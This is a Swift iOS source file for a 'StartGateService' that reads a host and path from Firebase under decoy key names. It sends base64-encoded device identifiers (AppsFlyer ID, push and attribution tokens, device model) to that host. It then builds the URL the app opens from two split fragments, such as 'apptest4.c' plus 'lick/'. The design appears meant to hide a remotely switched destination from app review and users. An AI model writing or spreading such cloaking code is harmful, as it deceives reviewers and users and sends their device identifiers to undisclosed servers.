import UIKit
import FirebaseDatabase
import AppsFlyerLib
import FirebaseCore
import FirebaseMessaging
import FirebaseDatabase



final class StartGateService {

    static let shared = StartGateService()
    private init() {}

    private lazy var dbRef: DatabaseReference = {
        Database.database(url: MyConstants.realtimeDBURL).reference()
    }()

    private(set) var sessionUUID: String = ""
    private(set) var attToken: String?

    func configureSession(uuid: String, attToken: String?) {
        sessionUUID = uuid
        self.attToken = attToken
        print("🧩 StartGateService: session configured (uuid=\(uuid))")
    }

    enum StartGateError: Error { case noData, invalidConfig, network(Error), timeout }

    /// Максимальное время ожидания всей операции (чтение из БД + резолв редиректов)
    private let overallTimeout: TimeInterval = 7.0
    /// Таймаут сетевого запроса для резолва финального URL
    private let resolveTimeout: TimeInterval = 5.0
    
    
    
    //MARK: - версия для Прода
//    func fetchConfig(completion: @escaping (Result<URL, Error>) -> Void) {
//        print("⏳ StartGateService: GET /config via getData")
//
//        // Глобальный фьюз: чтобы при зависании всегда был фоллбек
//        let overallTimeout: TimeInterval = 7.0
//        let fuse = DispatchWorkItem { [weak self] in
//            guard let self else { return }
//            print("⛔️ StartGateService: overall timeout")
//            FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_overall_timeout")
//            completion(.failure(StartGateError.timeout))
//        }
//        DispatchQueue.main.asyncAfter(deadline: .now() + overallTimeout, execute: fuse)
//
//        // 1) Читаем /config
//        dbRef.child("config").getData { [weak self] error, snapshot in
//            guard let self else { return }
//
//            if let error = error {
//                print("❌ StartGateService: getData error: \(error.localizedDescription)")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_fetch_error",
//                                        payload: ["error": error.localizedDescription])
//                fuse.cancel()
//                completion(.failure(StartGateError.network(error)))
//                return
//            }
//
//            guard let dict = snapshot?.value as? [String: Any] else {
//                print("❌ StartGateService: no config data")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_no_data")
//                fuse.cancel()
//                completion(.failure(StartGateError.noData))
//                return
//            }
//
//            print("✅ StartGateService: config dict = \(dict)")
//
//            // 2) Собираем базовый эндпойнт: приоритет - формат ТЗ (stray/swap), иначе fallback на "url"
//            let baseEndpoint: URL? = {
//                if let host = dict["stray"] as? String, !host.isEmpty,
//                   let path = dict["swap"]  as? String, !path.isEmpty {
//                    let normalizedPath = path.hasPrefix("/") ? path : ("/" + path)
//                    // сначала https
//                    if let https = URL(string: "https://\(host)\(normalizedPath)") {
//                        return https
//                    }
//                    // затем http
//                    if let http = URL(string: "http://\(host)\(normalizedPath)") {
//                        return http
//                    }
//                    return nil
//                }
//                if let urlString = dict["url"] as? String,
//                   let url = URL(string: urlString) {
//                    return url
//                }
//                return nil
//            }()
//
//            guard let baseEndpoint = baseEndpoint else {
//                print("❌ StartGateService: invalid config (no valid base endpoint)")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_invalid", payload: ["raw": dict])
//                fuse.cancel()
//                completion(.failure(StartGateError.invalidConfig))
//                return
//            }
//
//            print("🔗 Base endpoint = \(baseEndpoint.absoluteString)")
//
//            // 3) Собираем параметры, формируем ?data=BASE64(...)
//            let uuidForPayload = self.sessionUUID.isEmpty ? DeviceIDProvider.persistedLowerUUID() : self.sessionUUID
//
//            LinkBuilder.collectParams(uuid: uuidForPayload) { params in
//                guard let params = params else {
//                    print("❌ LinkBuilder.collectParams: missing required params (likely FCM token)")
//                    fuse.cancel()
//                    completion(.failure(StartGateError.invalidConfig))
//                    return
//                }
//
//                let b64 = LinkBuilder.makeBase64(from: params)
//                var comps = URLComponents(url: baseEndpoint, resolvingAgainstBaseURL: false) ?? URLComponents()
//                var items = comps.queryItems ?? []
//                items.append(URLQueryItem(name: "data", value: b64))
//                comps.queryItems = items
//
//                guard let requestURL = comps.url else {
//                    print("❌ StartGateService: failed to build request URL with data param")
//                    fuse.cancel()
//                    completion(.failure(StartGateError.invalidConfig))
//                    return
//                }
//
//                print("🚀 Requesting backend: \(requestURL.absoluteString)")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "backend_request", payload: ["url": requestURL.absoluteString])
//
//                // 4) Делаем запрос на бэк (ожидаем 2 строки в JSON: { "more":"...", "sea":".suffix" } — названия могут отличаться)
//                var req = URLRequest(url: requestURL)
//                req.httpMethod = "GET"
//                req.timeoutInterval = 7
//
//                URLSession.shared.dataTask(with: req) { data, _, error in
//                    if let error = error {
//                        print("❌ backend request error: \(error.localizedDescription)")
//                        FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "backend_error", payload: ["error": error.localizedDescription])
//                        fuse.cancel()
//                        completion(.failure(StartGateError.network(error)))
//                        return
//                    }
//
//                    guard
//                        let data,
//                        let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
//                    else {
//                        print("❌ backend invalid JSON")
//                        FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "backend_invalid_json")
//                        fuse.cancel()
//                        completion(.failure(StartGateError.invalidConfig))
//                        return
//                    }
//
//                    // Берём любые ДВЕ строковые части; если одна из них начинается с ".", считаем её суффиксом
//                    let stringValues = json.values.compactMap { $0 as? String }
//                    guard stringValues.count >= 2 else {
//                        print("❌ backend JSON parts < 2 → \(json)")
//                        FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "backend_insufficient_parts", payload: ["json": json])
//                        fuse.cancel()
//                        completion(.failure(StartGateError.invalidConfig))
//                        return
//                    }
//
//                    // Евристика: префикс = без точки, суффикс = с точкой; если не нашли — берём первые две как есть
//                    let suffix = stringValues.first(where: { $0.hasPrefix(".") })
//                    let prefix = stringValues.first(where: { !$0.hasPrefix(".") })
//                    let combined: String
//                    if let prefix = prefix, let suffix = suffix {
//                        combined = prefix + suffix          // напр. "apptest4" + ".click"
//                    } else {
//                        combined = stringValues.prefix(2).joined()
//                    }
//
//                    let finalStr = combined.hasPrefix("http") ? combined : "https://\(combined)"
//                    guard let finalURL = URL(string: finalStr) else {
//                        print("❌ finalURL invalid: \(finalStr)")
//                        FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "final_url_invalid", payload: ["value": finalStr])
//                        fuse.cancel()
//                        completion(.failure(StartGateError.invalidConfig))
//                        return
//                    }
//
//                    // 5) Кэшируем финальную ссылку и отдаём наружу
//                    UserDefaults.standard.set(finalURL.absoluteString, forKey: MyConstants.finalURLCacheKey)
//                    print("💾 cached final URL = \(finalURL.absoluteString)")
//                    FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "final_url_ready", payload: ["url": finalURL.absoluteString])
//
//                    fuse.cancel()
//                    completion(.success(finalURL))
//                }.resume()
//            }
//        }
//    }
    
    private let databaseRef = Database.database().reference()

//    func fetchConfig(completion: @escaping (Result<URL, Error>) -> Void) {
//            print("🚀 StartGateService: fetchConfig()")
//            
//            // MARK: 1. Получаем JSON с конфигом
//            getData(path: "/config") { result in
//                switch result {
//                case .failure(let error):
//                    print("❌ Firebase error: \(error.localizedDescription)")
//                    completion(.failure(error))
//                    return
//                    
//                case .success(let dict):
//                    print("✅ Config dict: \(dict)")
//                    
//                    // Извлекаем поля stray/swap
//                    guard
//                        let host = dict["stray"] as? String, !host.isEmpty,
//                        let path = dict["swap"] as? String, !path.isEmpty
//                    else {
//                        print("❌ Missing stray/swap in config")
//                        completion(.failure(StartGateError.invalidConfig))
//                        return
//                    }
//                    
//                    // Формируем базовый URL
//                    let normalizedPath = path.hasPrefix("/") ? path : "/" + path
//                    guard let baseEndpoint = URL(string: "https://\(host)\(normalizedPath)") else {
//                        print("❌ Invalid base endpoint")
//                        completion(.failure(StartGateError.invalidConfig))
//                        return
//                    }
//                    print("🔗 Base endpoint = \(baseEndpoint.absoluteString)")
//                    
//                    let appsflyerId: String = AppsFlyerLib.shared().getAppsFlyerUID()
//                    
//                    // MARK: 2. Формируем payload
//                    let payload = [
//                        "appsflyer_id": appsflyerId,
//                        "app_instance_id": Messaging.messaging().fcmToken ?? "",
//                        "uid": self.sessionUUID,
//                        "osVersion": UIDevice.current.systemVersion,
//                        "devModel": UIDevice.current.model,
//                        "bundle": Bundle.main.bundleIdentifier ?? "",
//                        "fcm_token": Messaging.messaging().fcmToken ?? "",
//                        "att_token": AdServicesTokenProvider.fetchBase64Token() ?? ""
//                    ]
//                        .map { "\($0)=\($1)" }
//                        .joined(separator: "&")
//                    
//                    print("🧾 Payload before base64: \(payload)")
//                    
//                    let base64 = payload.data(using: .utf8)?.base64EncodedString() ?? ""
//                    let encoded = base64.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? ""
//                    
//                    let requestURL = URL(string: "\(baseEndpoint)?data=\(encoded)")!
//                    print("🚀 Backend request: \(requestURL.absoluteString)")
//                    
//                    // MARK: 3. Таймаут защиты
//                    let fuse = DispatchWorkItem {
//                        print("⛔️ Timeout while fetching backend")
//                        completion(.failure(StartGateError.timeout))
//                    }
//                    DispatchQueue.main.asyncAfter(deadline: .now() + 25, execute: fuse)
//                    
//                    // MARK: 4. GET-запрос
//                    var req = URLRequest(url: requestURL)
//                    req.httpMethod = "GET"
//                    req.timeoutInterval = 20
//                    req.setValue(MyConstants.webUserAgent, forHTTPHeaderField: "User-Agent")
//                    
//                    URLSession.shared.dataTask(with: req) { data, resp, error in
//                        if let error = error {
//                            print("❌ Backend error: \(error.localizedDescription)")
//                            self.tryPostFallback(baseEndpoint: baseEndpoint, b64: base64, fuse: fuse, completion: completion)
//                            return
//                        }
//                        
//                        guard let data = data,
//                              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
//                            print("❌ Invalid backend response")
//                            self.tryPostFallback(baseEndpoint: baseEndpoint, b64: base64, fuse: fuse, completion: completion)
//                            return
//                        }
//                        
//                        guard
//                            let bat = json["beam"] as? String, !bat.isEmpty,
//                            let man = json["cyan"] as? String, !man.isEmpty
//                        else {
//                            print("⚠️ Missing bat/man in backend JSON: \(json)")
//                            self.tryPostFallback(baseEndpoint: baseEndpoint, b64: base64, fuse: fuse, completion: completion)
//                            return
//                        }
//                        
//                        let combined = (bat + man).trimmingCharacters(in: .whitespacesAndNewlines)
//                        let finalStr = combined.hasPrefix("http") ? combined : "https://\(combined)"
//                        
//                        guard let finalURL = URL(string: finalStr) else {
//                            print("❌ Invalid final URL: \(finalStr)")
//                            fuse.cancel()
//                            completion(.failure(StartGateError.invalidConfig))
//                            return
//                        }
//                        let combinedHostWithSlash = (bat + man).trimmingCharacters(in: .whitespacesAndNewlines)
//                        UserDefaults.standard.set(finalURL.absoluteString, forKey: MyConstants.finalURLCacheKey)
//                        print("💾 Cached final URL = \(finalURL.absoluteString)")
//                        print("🧱 Firebase base: host=\(host), path=\(normalizedPath) → https://\(host)\(normalizedPath)")
//                        print("🧱 Backend parts: bat='\(bat)', man='\(man)' → combined='\(combinedHostWithSlash)' → final='\(finalStr)'")
// 
//                        fuse.cancel()
//                        completion(.success(finalURL))
//                    }.resume()
//                }
//            }
//        }
    
    func fetchConfig(completion: @escaping (Result<URL, Error>) -> Void) {
        print("🚀 StartGateService: fetchConfig()")
        
        let db = Database.database().reference(withPath: "config")
        db.getData { error, snapshot in
            if let error = error {
                print("❌ Firebase getData error:", error.localizedDescription)
                completion(.failure(error))
                return
            }
            
            guard let value = snapshot?.value as? [String: Any] else {
                print("❌ Firebase snapshot is empty or invalid")
                completion(.failure(StartGateError.invalidConfig))
                return
            }
            
            print("✅ Firebase getData success:", value)
            guard
                let stray = value["stray"] as? String,
                let swap = value["swap"] as? String
            else {
                print("❌ Missing stray/swap in Firebase config:", value)
                completion(.failure(StartGateError.invalidConfig))
                return
            }
            
            let host = stray.trimmingCharacters(in: .whitespacesAndNewlines)
            let normalizedPath = swap.hasPrefix("/") ? swap : "/\(swap)"
            let baseEndpoint = "https://\(host)\(normalizedPath)"
            print("🔗 Base endpoint =", baseEndpoint)
            
            // --- Второй запрос к backend ---
            guard let url = URL(string: baseEndpoint) else {
                completion(.failure(StartGateError.invalidConfig))
                return
            }

                                let payload = [
                                    "appsflyer_id": AppsFlyerLib.shared().getAppsFlyerUID() ,
                                    "app_instance_id": Messaging.messaging().fcmToken ?? "",
                                    "uid": self.sessionUUID,
                                    "osVersion": UIDevice.current.systemVersion,
                                    "devModel": UIDevice.current.model,
                                    "bundle": Bundle.main.bundleIdentifier ?? "",
                                    "fcm_token": Messaging.messaging().fcmToken ?? "",
                                    "att_token": AdServicesTokenProvider.fetchBase64Token() ?? ""
                                ]
            
            let query = payload
                .map { "\($0)=\($1)" }
                .joined(separator: "&")
                .data(using: .utf8)?
                .base64EncodedString() ?? ""
            
            let finalURLString = "\(baseEndpoint)?data=\(query)"
            print("🚀 Backend request:", finalURLString)
            
            var request = URLRequest(url: URL(string: finalURLString)!)
            request.httpMethod = "GET"
            
            URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    print("❌ Backend request error:", error.localizedDescription)
                    completion(.failure(error))
                    return
                }
                
                guard let data = data else {
                    print("❌ Backend returned no data")
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }
                
                if let raw = String(data: data, encoding: .utf8) {
                    print("🧾 Backend raw JSON:", raw)
                }
                
                guard
                    let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
                else {
                    print("❌ Backend invalid JSON")
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }

                // --- Универсальный парсер частей домена ---
                func trim(_ s: String?) -> String? {
                    guard let t = s?.trimmingCharacters(in: .whitespacesAndNewlines),
                          !t.isEmpty else { return nil }
                    return t
                }

                let partA = trim(json["bat"] as? String) ?? trim(json["beam"] as? String)
                let partB = trim(json["man"] as? String) ?? trim(json["cyan"] as? String)

                let parts: [String] = {
                    if let a = partA, let b = partB { return [a, b] }
                    let all = json.values.compactMap { $0 as? String }
                        .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
                        .filter { !$0.isEmpty }
                    return Array(all.prefix(2))
                }()

                guard parts.count == 2 else {
                    print("❌ backend JSON: need 2 string parts, got:", json)
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }

                let suffix = parts.first(where: { $0.hasPrefix(".") })
                let prefix = parts.first(where: { !$0.hasPrefix(".") })
                
                let combinedHostWithSlash: String = {
                    if let p = prefix, let sfx = suffix { return p + sfx }
                    else { return parts[0] + parts[1] }
                }()
                
                let combinedHost = combinedHostWithSlash.hasSuffix("/") ?
                    String(combinedHostWithSlash.dropLast()) : combinedHostWithSlash
                
                let finalStr = combinedHost.hasPrefix("http") ? combinedHost : "https://\(combinedHost)"
                guard let finalURL = URL(string: finalStr) else {
                    print("❌ finalURL invalid:", finalStr)
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }

                print("💾 Cached final URL =", finalURL.absoluteString)
                UserDefaults.standard.set(finalURL.absoluteString, forKey: MyConstants.finalURLCacheKey)
                print("🧱 Backend parts:", parts, "→ final='\(finalURL.absoluteString)'")
                completion(.success(finalURL))
            }
            .resume()
        }
    }
        
        // MARK: - POST fallback
        private func tryPostFallback(baseEndpoint: URL,
                                     b64: String,
                                     fuse: DispatchWorkItem,
                                     completion: @escaping (Result<URL, Error>) -> Void) {
            var req = URLRequest(url: baseEndpoint)
            req.httpMethod = "POST"
            req.timeoutInterval = 20
            req.setValue("application/x-www-form-urlencoded; charset=utf-8", forHTTPHeaderField: "Content-Type")
            req.httpBody = "data=\(b64)".data(using: .utf8)
            
            print("🔁 POST fallback → \(baseEndpoint.absoluteString)")
            
            URLSession.shared.dataTask(with: req) { data, resp, error in
                if let error = error {
                    print("❌ POST fallback error: \(error.localizedDescription)")
                    fuse.cancel()
                    completion(.failure(error))
                    return
                }
                
                guard let data = data,
                      let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                      let bat = json["bat"] as? String,
                      let man = json["man"] as? String
                else {
                    print("❌ POST fallback invalid JSON")
                    fuse.cancel()
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }
                
                let combined = (bat + man).trimmingCharacters(in: .whitespacesAndNewlines)
                let finalStr = combined.hasPrefix("http") ? combined : "https://\(combined)"
                
                guard let finalURL = URL(string: finalStr) else {
                    print("❌ Invalid final URL (POST fallback): \(finalStr)")
                    fuse.cancel()
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }
                
                UserDefaults.standard.set(finalURL.absoluteString, forKey: MyConstants.finalURLCacheKey)
                print("💾 Cached final URL (POST) = \(finalURL.absoluteString)")
                fuse.cancel()
                completion(.success(finalURL))
            }.resume()
        }
        
        // MARK: - Firebase helper
        private func getData(path: String,
                             completion: @escaping (Result<[String: Any], Error>) -> Void) {
            print("⏳ Firebase: getData at \(path)")
            let ref = Database.database().reference().child(path)
            ref.getData { error, snapshot in
                if let error = error {
                    print("❌ Firebase getData error: \(error.localizedDescription)")
                    completion(.failure(error))
                    return
                }
                guard let value = snapshot?.value as? [String: Any] else {
                    print("⚠️ Firebase getData: no value")
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }
                print("✅ Firebase getData success: \(value)")
                completion(.success(value))
            }
        }

    //MARK: - версия для Теста
//    func fetchConfig(completion: @escaping (Result<URL, Error>) -> Void) {
//        print("⏳ StartGateService: GET /config via getData")
//
//        // Глобальный фьюз: чтобы при зависании всегда был фоллбек
//        let overallTimeout: TimeInterval = 7.0
//        let fuse = DispatchWorkItem { [weak self] in
//            guard let self else { return }
//            print("⛔️ StartGateService: overall timeout")
//            FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_overall_timeout")
//            completion(.failure(StartGateError.timeout))
//        }
//        DispatchQueue.main.asyncAfter(deadline: .now() + overallTimeout, execute: fuse)
//
//        // 1) Читаем /config
//        dbRef.child("config").getData { [weak self] error, snapshot in
//            guard let self else { return }
//
//            if let error = error {
//                print("❌ StartGateService: getData error: \(error.localizedDescription)")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_fetch_error",
//                                        payload: ["error": error.localizedDescription])
//                fuse.cancel()
//                completion(.failure(StartGateError.network(error)))
//                return
//            }
//
//            guard let dict = snapshot?.value as? [String: Any] else {
//                print("❌ StartGateService: no config data")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_no_data")
//                fuse.cancel()
//                completion(.failure(StartGateError.noData))
//                return
//            }
//
//            print("✅ StartGateService: config dict = \(dict)")
//
//            // 2) Собираем базовый эндпойнт: приоритет - формат ТЗ (stray/swap), иначе fallback на "url"
//            guard
//                let host = dict["stray"] as? String, !host.isEmpty,
//                let path = dict["swap"]  as? String, !path.isEmpty
//            else {
//                print("❌ StartGateService: нет ключей stray/swap")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_invalid_keys")
//                fuse.cancel()
//                completion(.failure(StartGateError.invalidConfig))
//                return
//            }
//
//            let normalizedPath = path.hasPrefix("/") ? path : "/" + path
//            guard let baseEndpoint = URL(string: "https://\(host)\(normalizedPath)") else {
//                print("❌ StartGateService: invalid base endpoint")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "config_invalid_url")
//                fuse.cancel()
//                completion(.failure(StartGateError.invalidConfig))
//                return
//            }
//            print("🔗 Base endpoint = \(baseEndpoint.absoluteString)")
//
//            // 3) Собираем параметры, формируем ?data=BASE64(...)
//            let uuidForPayload = self.sessionUUID.isEmpty ? DeviceIDProvider.persistedLowerUUID() : self.sessionUUID
//
//            LinkBuilder.collectParams(uuid: uuidForPayload) { params in
//                // 🔁 ВАЖНАЯ ПРАВКА: НЕ падаем, если params == nil (на симуляторе/без push).
//                // Подставляем «пустые» значения и идём дальше.
//                let p: LinkBuilder.Params
//                if let params = params {
//                    p = params
//                } else {
//                    print("⚠️ collectParams returned nil — continue with empty fields (dev/simulator)")
//                    p = LinkBuilder.Params(
//                        appsflyer_id: "",
//                        app_instance_id: "",
//                        uid: uuidForPayload,
//                        osVersion: UIDevice.current.systemVersion,
//                        devModel: UIDevice.current.model,
//                        bundle: Bundle.main.bundleIdentifier ?? "",
//                        fcm_token: "", att_token: "" // пустой токен допустим для DEV
//                    )
//                    FirebaseLogger.logEvent(uuid: self.sessionUUID,
//                                            name: "collect_params_nil_fallback")
//                }
//
//                print("🔍 Raw query string before base64:", params)
//
//                let b64 = LinkBuilder.makeBase64(from: p)
//                var comps = URLComponents(url: baseEndpoint, resolvingAgainstBaseURL: false) ?? URLComponents()
//                var items = comps.queryItems ?? []
//                items.append(URLQueryItem(name: "data", value: b64))
//                comps.queryItems = items
//
//                guard let requestURL = comps.url else {
//                    print("❌ StartGateService: failed to build request URL with data param")
//                    fuse.cancel()
//                    completion(.failure(StartGateError.invalidConfig))
//                    return
//                }
//
//                print("🚀 Requesting backend: \(requestURL.absoluteString)")
//                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "backend_request", payload: ["url": requestURL.absoluteString])
//
//                // 4) Делаем запрос на бэк …
//                URLSession.shared.dataTask(with: requestURL) { data, resp, error in
//                    if let error = error {
//                        print("❌ backend request error: \(error.localizedDescription)")
//                        FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "backend_error",
//                                                payload: ["error": error.localizedDescription])
//                        fuse.cancel()
//                        completion(.failure(StartGateError.network(error)))
//                        return
//                    }
//
//                    // (опционально) проверим код ответа
//                    if let http = resp as? HTTPURLResponse, !(200...299).contains(http.statusCode) {
//                        print("❌ backend http \(http.statusCode)")
//                        FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "backend_http_code",
//                                                payload: ["code": http.statusCode])
//                        fuse.cancel()
//                        completion(.failure(StartGateError.invalidConfig))
//                        return
//                    }
//
//                    guard
//                        let data,
//                        let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
//                        let bat  = json["bat"]  as? String,
//                        let man  = json["man"]  as? String
//                    else {
//                        print("❌ backend JSON: нет ключей 'bat'/'man'")
//                        FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "backend_missing_bat_man")
//                        fuse.cancel()
//                        completion(.failure(StartGateError.invalidConfig))
//                        return
//                    }
//
//                    // Пример: bat="apptest4.c", man="lick/" → "apptest4.click/"
//                    let combinedHostWithSlash = (bat + man)
//                        .trimmingCharacters(in: .whitespacesAndNewlines)
//
//                    // уберём финальный "/" для красоты (не обязательно)
//                    let combinedHost = combinedHostWithSlash.hasSuffix("/") ?
//                        String(combinedHostWithSlash.dropLast()) : combinedHostWithSlash
//
//                    let finalStr = combinedHost.hasPrefix("http") ? combinedHost : "https://\(combinedHost)"
//                    guard let finalURL = URL(string: finalStr) else {
//                        print("❌ finalURL invalid: \(finalStr)")
//                        FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "final_url_invalid", payload: ["value": finalStr])
//                        fuse.cancel()
//                        completion(.failure(StartGateError.invalidConfig))
//                        return
//                    }
//
//                    UserDefaults.standard.set(finalURL.absoluteString, forKey: MyConstants.finalURLCacheKey)
//                    print("💾 cached final URL = \(finalURL.absoluteString)")
//                    FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "final_url_ready", payload: ["url": finalURL.absoluteString])
//
//                    fuse.cancel()
//                    completion(.success(finalURL))
//                }.resume()
//
//            }
//        }
//    }


    // MARK: - Private helpers

    private func tryHTTPFallback(httpCandidate: String,
                                 fuse: DispatchWorkItem,
                                 completion: @escaping (Result<URL, Error>) -> Void) {
        guard let httpURL = URL(string: httpCandidate) else {
            print("❌ StartGateService: invalid http candidate \(httpCandidate)")
            fuse.cancel()
            completion(.failure(StartGateError.invalidConfig))
            return
        }
        print("🔁 StartGateService: try HTTP fallback \(httpCandidate)")
        resolveFinalURL(from: httpURL) { [weak self] finalURLString in
            guard let self else { return }
            let chosenStr = finalURLString.isEmpty ? httpCandidate : finalURLString
            guard let chosenURL = URL(string: chosenStr) else {
                fuse.cancel()
                completion(.failure(StartGateError.invalidConfig))
                return
            }
            self.fetchPossibleRedirectJSON(from: chosenURL) { jsonURL in
                fuse.cancel()
                let openURL = jsonURL ?? chosenURL
                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "open_target_url",
                                        payload: ["url": openURL.absoluteString])
                print("🎯 StartGateService: openURL = \(openURL)")
                completion(.success(openURL))
            }
        }
    }

    private func resolveFinalURL(from url: URL, completion: @escaping (String) -> Void) {
        print("⏳ StartGateService: resolveFinalURL \(url)")

        let resolveTimeout: TimeInterval = 5.0
        var timedOut = false
        let localFuse = DispatchWorkItem {
            timedOut = true
            print("⛔️ StartGateService: resolveFinalURL timeout")
            completion("") // вернём пусто — снаружи подставят initial
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + resolveTimeout, execute: localFuse)

        let handler = RedirectHandler { finalURL in
            if timedOut { return }
            localFuse.cancel()
            print("✅ RedirectHandler finalURL=\(finalURL)")
            completion(finalURL)
        }

        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest  = resolveTimeout
        cfg.timeoutIntervalForResource = resolveTimeout
        let session = URLSession(configuration: cfg, delegate: handler, delegateQueue: nil)

        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        req.timeoutInterval = resolveTimeout
        session.dataTask(with: req).resume()
    }

    /// Если по целевому URL прилетает JSON вида { "bat": "apptest4.c", "man": "lick/" },
    /// собираем https://apptest4.click/ и возвращаем его; иначе возвращаем nil.
    private func fetchPossibleRedirectJSON(from url: URL, completion: @escaping (URL?) -> Void) {
        print("🔎 StartGateService: fetchPossibleRedirectJSON \(url.absoluteString)")
        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        req.timeoutInterval = 5

        URLSession.shared.dataTask(with: req) { data, _, _ in
            guard
                let data,
                let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
            else { return completion(nil) }

            if let bat = json["bat"] as? String,
               let man = json["man"] as? String {
                let host = bat + man                 // "apptest4.c" + "lick/" => "apptest4.click/"
                let assembled = "https://\(host)"
                let final = URL(string: assembled)
                print("🔧 Assembled host from JSON = \(assembled)")
                completion(final)
                return
            }
            completion(nil)
        }.resume()
    }
}
